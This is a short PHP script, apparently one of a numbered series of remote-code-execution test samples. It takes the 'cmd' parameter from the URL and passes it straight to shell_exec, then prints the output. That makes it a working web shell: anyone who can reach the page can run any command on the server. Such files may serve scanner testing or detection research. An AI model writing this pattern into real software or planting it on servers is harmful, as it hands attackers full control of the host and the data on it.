<?php
// RCE test variation #968
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>